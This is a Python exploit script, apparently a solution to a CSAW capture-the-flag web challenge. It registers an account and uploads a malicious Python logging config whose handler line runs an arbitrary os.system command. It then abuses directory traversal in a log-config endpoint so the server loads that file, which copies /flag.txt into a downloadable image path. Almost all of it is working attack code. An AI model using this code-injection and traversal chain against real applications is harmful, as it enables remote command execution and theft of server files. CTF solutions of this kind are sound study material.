import requests 
import json
import os

#script_dir = os.path.basename(os.path.dirname(os.path.realpath(__file__)))
script_dir = os.path.dirname(__file__)
if script_dir == '':
	script_dir = '.'

api_url = "http://web.chal.csaw.io:5012"
#api_url = "http://127.0.0.1:1337"

username = "test1"
password = "test2"

def register(username, password):

    url = api_url + "/api/register"

    payload = json.dumps({
       "username": username,
       "password": password 
    })

    headers = {
        'Content-Type': 'application/json'
    }

    response = requests.request("POST", url, headers=headers, data=payload)

    return response

def login(username, password):

    url = api_url + "/api/login"

    payload = json.dumps({
        "username": username,
        "password": password
    })

    headers = {
        'Content-Type': 'application/json'
    }

    connection = requests.Session()

    response = connection.request("POST", url, headers=headers, data=payload)

    return response,connection

def upload(connection, filename):

    url = api_url + "/api/upload"

    with open(filename, "rb") as f:
        data = f.read()

    files = {'file': data}
    values = {'label': 'planet'}

    response = connection.request("POST", url, files=files, data=values)

    return response

def set_log(connection, filename):

    url = api_url + "/api/log_config"

    payload = json.dumps({
            "filename": filename
        })

    headers = {
        'Content-Type': 'application/json'
    }

    response = connection.request("POST", url, headers=headers, data=payload)

    return response

def exploit_file(command):
    
    filename = f"{script_dir}/exploit.conf"

    #https://github.com/raj3shp/python-logging.config-exploit/blob/main/exploit/bad-logger.conf
    file = f"""[loggers]
keys=root,simpleExample

[handlers]
keys=consoleHandler

[formatters]
keys=simpleFormatter

[logger_root]
level=DEBUG
handlers=consoleHandler

[logger_simpleExample]
level=DEBUG
handlers=consoleHandler
qualname=simpleExample
propagate=0

[handler_consoleHandler]
class=__import__('os').system('{command}')
level=DEBUG
formatter=simpleFormatter
args=(sys.stdout,)

[formatter_simpleFormatter]
format=%(asctime)s - %(name)s - %(levelname)s - %(message)s
"""

    with open(filename, "w") as f:
        f.write(file)

    return filename
    
def gallery_call(connection):

    url = api_url + "/api/gallery"

    response = connection.request("GET", url)

    return response

def download_file(connection, filename):
    query = "file=" + requests.utils.quote(filename)
    url = api_url + "/api/download_image?" + query

    response = connection.request("GET", url)

    return response

def main():
    # Register an account
    response = register(username, password)

    #Login
    response, connection = login(username, password)

    image_file = f"{script_dir}/saturn.jpg"

    #upload a file so we receieve a folder location we know we can pull from
    upload(connection,image_file)

    #get the last item in our gallery (the one we just uploaded)
    file_1 = json.loads(gallery_call(connection).text)['message'][-1]

    #The exploit will copy the flag to our first uploaded file location
    command = f"cp /flag.txt /app/application/static/images/{file_1}"

    #Craft our exploit logger config file
    exploit = exploit_file(command)

    #upload the malicious logger file
    print(upload(connection,exploit))


    #get the last item in our gallery (the one we just uploaded)
    file_2 = json.loads(gallery_call(connection).text)['message'][-1] 

    filename = f"../images/{file_2}"

    #Set the log file with our directory traversal vulnerability
    #When this config is loaded the flag will be copied to the first upload location
    response = set_log(connection, filename)

    print(response.text)

    #Download from the location of the first file upload
    print(download_file(connection, file_1).text)

if __name__ == "__main__":
    main()
